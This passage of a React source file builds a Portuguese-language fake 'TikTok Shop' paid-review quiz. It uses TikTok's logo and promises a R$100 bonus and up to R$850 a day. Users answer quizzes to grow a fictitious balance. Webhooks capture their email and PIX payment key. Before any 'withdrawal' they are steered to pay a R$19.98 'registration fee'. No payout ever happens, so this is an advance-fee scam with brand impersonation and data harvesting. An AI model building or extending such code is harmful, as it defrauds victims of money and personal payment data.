  onBack: () => void;
  onWithdraw: (amount: number, pixKey: string, keyType: string) => void;
}) => {
  const [selectedAmount, setSelectedAmount] = useState<number | null>(10);
  const [keyType, setKeyType] = useState<string>("");
  const [pixKey, setPixKey] = useState<string>("");

  const predefinedAmounts = [1.5, 5, 10, totalEarned];

  const handleWithdraw = () => {
    if (!selectedAmount || !keyType || !pixKey) {
      alert("Por favor, preencha todos os campos");
      return;
    }
    onWithdraw(selectedAmount, pixKey, keyType);
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white shadow-sm p-4 flex items-center justify-between">
        <button onClick={onBack} className="p-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <h1 className="text-lg font-semibold text-gray-800">Resgatar recompensas</h1>
        <button className="p-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
        </button>
      </div>

      <div className="p-4 space-y-4">
        {/* Saldo Card */}
        <div className="bg-black rounded-xl p-4 text-white">
          <div className="flex items-center justify-between mb-3">
            <div>
              <p className="text-sm text-gray-400 mb-1">Seu saldo</p>
              <p className="text-2xl font-bold">R${totalEarned.toFixed(2).replace('.', ',')}</p>
            </div>
            <div className="w-12 h-12 bg-yellow-400 rounded-full flex items-center justify-center">
              <span className="text-black font-bold text-xl">P</span>
            </div>
          </div>
          <div className="pt-3 border-t border-gray-700">
            <p className="text-sm text-gray-400 mb-1">Últimas recompensas:</p>
            <p className="text-lg font-semibold">R${lastReward.toFixed(2).replace('.', ',')}</p>
          </div>
        </div>

        {/* Sacar dinheiro section */}
        <div className="bg-white rounded-xl p-4 shadow-sm">
          <h2 className="text-lg font-bold text-gray-800 mb-4">Sacar dinheiro</h2>
          
          {/* Transferência bancária */}
          <div className="flex items-center gap-2 mb-4 pb-4 border-b border-gray-200">
            <span className="text-sm text-gray-700">Transferência bancária /</span>
            <svg className="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
            </svg>
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
          </div>

          {/* Valores pré-definidos */}
          <div className="grid grid-cols-4 gap-2 mb-4">
            {predefinedAmounts.map((amount) => (
              <button
                key={amount}
                onClick={() => setSelectedAmount(amount)}
                className={`py-3 px-2 rounded-lg font-semibold text-sm transition-colors ${
                  selectedAmount === amount
                    ? 'bg-pink-500 text-white'
                    : 'bg-gray-100 text-gray-800 hover:bg-gray-200'
                }`}
              >
                R${amount === totalEarned ? amount.toFixed(2).replace('.', ',') : amount.toFixed(1).replace('.', ',')}
              </button>
            ))}
          </div>

          {/* Tipo de chave */}
          <div className="mb-4">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Selecione o tipo de chave:
            </label>
            <select
              value={keyType}
              onChange={(e) => setKeyType(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500"
            >
              <option value="">Selecione...</option>
              <option value="cpf">CPF</option>
              <option value="email">E-mail</option>
              <option value="telefone">Telefone</option>
              <option value="chave-aleatoria">Chave Aleatória</option>
            </select>
          </div>

          {/* Chave PIX */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Digite a sua chave PIX
            </label>
            <input
              type="text"
              value={pixKey}
              onChange={(e) => setPixKey(e.target.value)}
              placeholder="Digite sua chave PIX"
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500"
            />
          </div>

          {/* Botão realizar saque */}
          <button
            onClick={handleWithdraw}
            className="w-full bg-pink-500 text-white py-4 rounded-lg font-bold text-lg hover:bg-pink-600 transition-colors"
          >
            REALIZAR SAQUE
          </button>
        </div>
      </div>
    </div>
  );
};

// Main Quiz Component
export default function TikTokQuiz() {
  const [currentStep, setCurrentStep] = useState(0);
  const [totalEarned, setTotalEarned] = useState(100.0);
  const [selectedOption, setSelectedOption] = useState<string>("");
  const [showRewardModal, setShowRewardModal] = useState(false);
  const [showFinalModal, setShowFinalModal] = useState(false);
  const [completedEvaluations, setCompletedEvaluations] = useState(0);
  const [email, setEmail] = useState("");
  const [confetti, setConfetti] = useState(false);
  const [showWithdrawScreen, setShowWithdrawScreen] = useState(false);
  const [showRegistrationFee, setShowRegistrationFee] = useState(false);
  const [showBalanceUnlock, setShowBalanceUnlock] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [lastReward, setLastReward] = useState(0);
  const registrationFeeAmount = 19.98;

  // Lógica do fluxo:
  // currentStep 0-3: Perguntas iniciais (steps 1-4 do array, índices 0-3)
  // currentStep 4: Tela de email (não está no array quizSteps)
  // currentStep 5+: Quizzes de produtos (steps 5+ do array, índices 4+)
  const isInitialSteps = currentStep < 4;
  const isEmailStep = currentStep === 4;
  const isFinalStep = currentStep === quizSteps.length + 1; // +1 porque email não está no array
  const currentStepData = isEmailStep ? null : (currentStep >= 5 ? quizSteps[currentStep - 1] : quizSteps[currentStep]);

  useEffect(() => {
    if (confetti) {
      const timer = setTimeout(() => setConfetti(false), 3000);
      return () => clearTimeout(timer);
    }
  }, [confetti]);

  const handleOptionSelect = (optionId: string) => {
    setSelectedOption(optionId);
  };

  const handleContinue = () => {
    if (!selectedOption && !isEmailStep) return;
    if (isEmailStep && !email) return;

    // Se estiver na tela de email, vai para o primeiro quiz de produto (step 5)
    if (isEmailStep) {
      // Webhook: Email capturado
      sendWebhookEvent('email_captured', {
        email: email,
        step: 'email_confirmation'
      });
      
      setCurrentStep(5);
      setSelectedOption("");
      return;
    }

    const reward = currentStepData?.reward || 0;

    if (reward > 0) {
      setShowRewardModal(true);
      setTotalEarned(prev => prev + reward);
      setLastReward(reward);
      setCompletedEvaluations(prev => prev + 1);
      setConfetti(true);
      
      // Webhook: Recompensa ganha
      sendWebhookEvent('reward_earned', {
        amount: reward,
        totalEarned: totalEarned + reward,
        step: currentStep
      });
    } else {
      goToNextStep();
    }
  };

  const goToNextStep = () => {
    setSelectedOption("");
    setCurrentStep(prev => prev + 1);
  };

  const handleModalContinue = () => {
    setShowRewardModal(false);
    
    // Ajuste para considerar que email não está no array
    const currentQuizIndex = currentStep >= 5 ? currentStep - 1 : currentStep;
    if (currentQuizIndex === quizSteps.length - 1) {
      setShowFinalModal(true);
    } else {
      goToNextStep();
    }
  };

  const handleWithdraw = () => {
    setShowFinalModal(false);
    
    // Webhook: Início do processo de saque
    sendWebhookEvent('withdraw_initiated', {
      totalEarned: totalEarned,
      completedEvaluations: completedEvaluations
    });
    
    // Mostra primeiro a tela de resgate de recompensas
    setShowWithdrawScreen(true);
  };

  const handleWithdrawSubmit = (amount: number, pixKey: string, keyType: string) => {
    // Webhook: Dados de saque preenchidos
    sendWebhookEvent('withdraw_data_submitted', {
      amount: amount,
      pixKey: pixKey,
      keyType: keyType,
      totalEarned: totalEarned
    });
    
    // Após preencher os dados de saque, vai para a tela de desbloqueio
    setShowWithdrawScreen(false);
    setShowBalanceUnlock(true);
  };

  const handleBackFromWithdraw = () => {
    setShowWithdrawScreen(false);
  };

  const handleBackFromBalanceUnlock = () => {
    setShowBalanceUnlock(false);
    setShowWithdrawScreen(true);
  };

  const handleUnlockBalance = () => {
    // Webhook: Saldo desbloqueado
    sendWebhookEvent('balance_unlocked', {
      totalEarned: totalEarned
    });
    
    // Após desbloquear assistindo o vídeo, mostra o modal de pagamento
    setShowBalanceUnlock(false);
    setShowPaymentModal(true);
  };

  const handlePayment = () => {
    // Webhook: Pagamento realizado
    sendWebhookEvent('payment_completed', {
      amount: registrationFeeAmount,
      paymentMethod: 'pix', // ou 'card' dependendo do método selecionado
      totalEarned: totalEarned
    });
    
    // Aqui você integrará com o gateway de pagamento posteriormente
    // Por enquanto, apenas processa o pagamento e vai para a tela de taxa de cadastro
    alert(`Processando pagamento de R$ ${registrationFeeAmount.toFixed(2)}...\n\nIntegração com gateway de pagamento será feita posteriormente.`);
    setShowPaymentModal(false);
    setShowRegistrationFee(true);
  };

  const handleClosePaymentModal = () => {
    setShowPaymentModal(false);
    setShowBalanceUnlock(true); // Volta para a tela de desbloqueio
  };

  const handleBackFromRegistrationFee = () => {
    setShowRegistrationFee(false);
  };

  const handlePayRegistrationFee = () => {
    // Após pagar a taxa, pode processar o saque ou mostrar sucesso
    alert("Taxa de cadastro processada! Seu saque será processado em breve.");
    setShowRegistrationFee(false);
  };

  const handleBack = () => {
    if (currentStep > 0) {
      setCurrentStep(prev => prev - 1);
      setSelectedOption("");
    }
  };

  if (isFinalStep) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-lg p-8 max-w-md w-full text-center">
          <div className="mb-6">
            <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Shop" className="h-8 mx-auto mb-4" />
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Parabéns!</h2>
            <p className="text-gray-600 mb-4">
              Você realizou <strong>{completedEvaluations} avaliações</strong> ⭐ Continue avaliando conclua sua meta de 10 avaliações para poder sacar.
            </p>
            <div className="bg-pink-500 text-white py-2 px-4 rounded-full inline-block font-semibold mb-4">
              Seu Saldo: R$ {totalEarned.toFixed(2).replace('.', ',')}
            </div>
          </div>
          <button
            onClick={() => setCurrentStep(5)}
            className="w-full bg-pink-500 text-white py-3 rounded-lg font-semibold mb-4 hover:bg-pink-600 transition-colors"
          >
            Continuar Avaliando
          </button>
          <p className="text-xs text-gray-500 mb-2">
            Concluindo sua meta você poderá ganhar até <strong>R$ 850,00</strong>.
          </p>
        </div>
      </div>
    );
  }

  if (isEmailStep) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <style>{`
          @keyframes confetti-fall {
            to {
              transform: translateY(100vh) rotate(360deg);
            }
          }
          .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            top: -10px;
            animation: confetti-fall 3s linear forwards;
          }
        `}</style>

        {confetti && (
          <div className="confetti-container fixed inset-0 pointer-events-none z-50">
            {[...Array(50)].map((_, i) => (
              <div
                key={i}
                className="confetti"
                style={{
                  left: `${Math.random() * 100}%`,
                  animationDelay: `${Math.random() * 3}s`,
                  backgroundColor: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'][Math.floor(Math.random() * 5)]
                }}
              />
            ))}
          </div>
        )}

        <div className="bg-white shadow-sm p-3 sm:p-4 flex items-center justify-between">
          <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Shop" className="h-5 sm:h-6" />
          <div className="bg-green-100 text-green-800 px-2 sm:px-4 py-1 rounded-full text-xs sm:text-sm font-semibold text-center">
            <span className="hidden sm:inline">GANHE R$ 100,00 DE BÔNUS INICIAL</span>
            <span className="sm:hidden">BÔNUS R$ 100</span>
          </div>
        </div>

        <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6">
          <div className="bg-blue-50 rounded-2xl p-4 sm:p-8 mb-6 max-w-md w-full">
            <div className="bg-white rounded-xl p-4 sm:p-6 mb-4 sm:mb-6 shadow-sm">
              <div className="bg-gradient-to-r from-purple-100 to-pink-100 rounded-lg p-4 sm:p-6 text-center">
                <p className="font-semibold text-gray-800 mb-2 text-base sm:text-lg">
                  Ganhe até <span className="text-xl sm:text-2xl text-purple-600">R$ 850,00</span>
                </p>
                <p className="text-xs sm:text-sm text-gray-700">avaliando produtos no conforto da sua casa</p>
              </div>
            </div>

            <div className="text-center mb-4 sm:mb-6">
              <p className="font-semibold text-gray-800 mb-3 sm:mb-4 text-sm sm:text-base">
                Você foi <strong className="text-purple-600">selecionado</strong> para participar da nossa plataforma de avaliações pagas.
              </p>
              <p className="text-xs sm:text-sm text-gray-700 mb-3 sm:mb-4">
                Ganhe até <strong>R$ 850,00</strong> por dia avaliando produtos da TikTok Shop, direto do seu celular.
              </p>
              <div className="bg-yellow-50 border-2 border-yellow-300 rounded-lg p-3 mb-4">
                <p className="text-xs sm:text-sm text-gray-700">
                  🎉 Basta confirmar sua participação abaixo para liberar o acesso ao painel de avaliações.
                </p>
                <p className="text-xs font-semibold text-red-600 mt-2">As vagas são limitadas!</p>
              </div>
            </div>

            <div className="mb-4">
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Digite seu e-mail:
              </label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="seuemail@exemplo.com"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 text-base"
              />
            </div>

            <button
              onClick={handleContinue}
              disabled={!email}
              className="w-full bg-pink-500 text-white py-3 sm:py-4 rounded-lg font-bold text-base sm:text-lg hover:bg-pink-600 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed mb-4 active:scale-[0.98] shadow-lg disabled:shadow-none"
            >
              ENTRAR E LIBERAR AVALIAÇÕES
            </button>

            <div className="space-y-2 text-xs sm:text-sm">
              <div className="flex items-center gap-2 text-gray-700">
                <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-green-500 flex-shrink-0" />
                <span>Bônus imediato de R$ 100,00</span>
              </div>
              <div className="flex items-center gap-2 text-gray-700">
                <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-green-500 flex-shrink-0" />
                <span>Até R$ 850,00 por dia em tarefas</span>
              </div>
              <div className="flex items-center gap-2 text-gray-700">
                <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-green-500 flex-shrink-0" />
                <span>100% online, sem vender nada</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Verificação de segurança
  if (!currentStepData && !isEmailStep && !isFinalStep) {
    return <div>Carregando...</div>;
  }

  // Ordem de renderização das telas de saque:
  // 1. Tela de Resgate (quando clica em SACAR)
  // 2. Tela de Desbloqueio (após preencher dados e clicar REALIZAR SAQUE)
  // 3. Tela de Taxa de Cadastro (após assistir vídeo e desbloquear)

  // 1. Mostrar tela de resgate de recompensas
  if (showWithdrawScreen) {
    return (
      <WithdrawScreen
        totalEarned={totalEarned}
        lastReward={lastReward}
        onBack={handleBackFromWithdraw}
        onWithdraw={handleWithdrawSubmit}
      />
    );
  }

  // 2. Mostrar tela de desbloqueio de saldo (após preencher dados de saque)
  if (showBalanceUnlock) {
    return (
      <BalanceUnlockScreen
        totalEarned={totalEarned}
        onUnlock={handleUnlockBalance}
        onBack={handleBackFromBalanceUnlock}
      />
    );
  }

  // 3. Mostrar tela de taxa de cadastro (após desbloquear)
  if (showRegistrationFee) {
    return (
      <RegistrationFeeScreen
        onPay={handlePayRegistrationFee}
        onBack={handleBackFromRegistrationFee}
      />
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <style>{`
        @keyframes confetti-fall {
          to {
            transform: translateY(100vh) rotate(360deg);
          }
        }
        .confetti {
          position: absolute;
          width: 10px;
          height: 10px;
          top: -10px;
          animation: confetti-fall 3s linear forwards;
        }
      `}</style>

      {confetti && (
        <div className="confetti-container fixed inset-0 pointer-events-none z-50">
          {[...Array(50)].map((_, i) => (
            <div
              key={i}
              className="confetti"
              style={{
                left: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 3}s`,
                backgroundColor: ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'][Math.floor(Math.random() * 5)]
              }}
            />
          ))}
        </div>
      )}

      <div className="bg-white shadow-sm p-3 sm:p-4 flex items-center justify-between sticky top-0 z-40">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Shop" className="h-5 sm:h-6" />
        <div className="flex items-center gap-2 sm:gap-3">
          <div className="bg-white border border-gray-300 px-2 sm:px-4 py-1 rounded-lg text-xs sm:text-sm font-semibold text-gray-800">
            R${totalEarned.toFixed(2).replace('.', ',')}
          </div>
          <button 
            onClick={handleWithdraw}
            className="bg-pink-500 text-white px-3 sm:px-6 py-1 rounded-lg text-xs sm:text-sm font-semibold hover:bg-pink-600 transition-colors active:scale-95"
          >
            SACAR
          </button>
        </div>
      </div>

      {!isInitialSteps && !isEmailStep && (
        <div className="bg-gray-200 h-1 w-full">
          <div 
            className="bg-pink-500 h-1 transition-all duration-300"
            style={{ width: `${((currentStep - 5) / (quizSteps.length - 4)) * 100}%` }}
          />
        </div>
      )}

      <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 pb-20 sm:pb-6">
        <div className="w-full max-w-md mx-auto">
          {isInitialSteps && (
            <div className="mb-6">
              {/* Indicador de progresso simplificado */}
              <div className="flex items-center justify-center gap-2 sm:gap-4 mb-6">
                {[1, 2, 3, 4].map((step) => (
                  <React.Fragment key={step}>
                    <div className={`w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center font-semibold text-sm sm:text-base shadow-md transition-all ${
                      currentStep + 1 === step 
                        ? 'bg-pink-500 text-white scale-110' 
                        : currentStep + 1 > step 
                        ? 'bg-pink-200 text-pink-600' 
                        : 'bg-gray-200 text-gray-500'
                    }`}>
                      {step}
                    </div>
                    {step < 4 && <div className="w-6 sm:w-8 h-0.5 bg-gray-300" />}
                  </React.Fragment>
                ))}
              </div>
            </div>
          )}

          {currentStepData && (
            <>
              <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-4 sm:mb-6 text-center px-2">
                {currentStepData.question}
              </h2>

              {currentStepData.description && (
                <div className="bg-white rounded-xl p-4 sm:p-6 mb-4 sm:mb-6 shadow-sm">
                  <pre className="whitespace-pre-wrap font-sans text-gray-700 text-sm sm:text-base leading-relaxed">
                    {currentStepData.description}
                  </pre>
                </div>
              )}

              {currentStepData.image && (
                <div className="mb-4 sm:mb-6 flex justify-center">
                  <img 
                    src={currentStepData.image} 
                    alt="Produto" 
                    className="rounded-xl w-full max-w-xs sm:max-w-sm h-auto object-cover shadow-lg"
                  />
                </div>
              )}

              <p className="text-gray-600 text-center mb-3 sm:mb-4 font-medium text-sm sm:text-base px-2">
                Selecione uma opção para continuar:
              </p>

              <div className="space-y-2 sm:space-y-3 mb-4 sm:mb-6">
                {currentStepData.options.map((option) => (
              <button
                key={option.id}
                onClick={() => handleOptionSelect(option.id)}
                className={`w-full p-3 sm:p-4 rounded-xl border-2 text-left transition-all flex items-center justify-between active:scale-[0.98] ${
                  selectedOption === option.id
                    ? 'border-pink-500 bg-pink-50 shadow-md'
                    : 'border-gray-300 bg-white hover:border-pink-300 hover:shadow-sm'
                }`}
              >
                <div className="flex items-center gap-2 sm:gap-3 flex-1">
                  {option.emoji && <span className="text-xl sm:text-2xl">{option.emoji}</span>}
                  <span className="font-medium text-gray-800 text-sm sm:text-base">{option.text}</span>
                </div>
                {selectedOption === option.id && (
                  <div className="w-5 h-5 sm:w-6 sm:h-6 bg-pink-500 rounded-full flex items-center justify-center flex-shrink-0 ml-2">
                    <svg className="w-3 h-3 sm:w-4 sm:h-4 text-white" fill="none" strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" viewBox="0 0 24 24" stroke="currentColor">
                      <path d="M5 13l4 4L19 7"></path>
                    </svg>
                  </div>
                  )}
                </button>
              ))}
            </div>

            <div className="flex gap-2 sm:gap-3">
              {currentStep > 0 && !isEmailStep && (
                <button
                  onClick={handleBack}
                  className="flex-1 bg-gray-200 text-gray-800 py-3 sm:py-4 rounded-xl font-semibold hover:bg-gray-300 transition-colors text-sm sm:text-base active:scale-[0.98]"
                >
                  Voltar
                </button>
              )}
              <button
                onClick={handleContinue}
                disabled={!selectedOption}
                className="flex-1 bg-pink-500 text-white py-3 sm:py-4 rounded-xl font-semibold hover:bg-pink-600 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed text-sm sm:text-base active:scale-[0.98] shadow-lg disabled:shadow-none"
              >
                {isInitialSteps ? 'Próximo Passo' : 'Continuar'}
              </button>
            </div>

            <div className="mt-4 sm:mt-6 text-center">
              <p className="text-green-600 font-medium text-xs sm:text-sm mb-2 bg-green-50 py-2 px-3 sm:px-4 rounded-lg inline-block">
                Concorra a um Bônus adicional
              </p>
            </div>

            {!isInitialSteps && !isEmailStep && (
              <div className="mt-4 sm:mt-6 space-y-2 text-center">
                <p className="text-xs sm:text-sm text-gray-600">
                  Avaliação {currentStep - 4} de {quizSteps.length - 4}
                </p>
              </div>
            )}
            </>
          )}
        </div>
      </div>

      <RewardModal 
        show={showRewardModal}
        amount={currentStepData?.reward || 0}
        onContinue={handleModalContinue}
      />

      <FinalModal
        show={showFinalModal}
        totalAmount={totalEarned}
        onWithdraw={handleWithdraw}
      />

      <PaymentModal
        show={showPaymentModal}
        amount={registrationFeeAmount}
        onPay={handlePayment}
        onClose={handleClosePaymentModal}
      />
    </div>
  );
}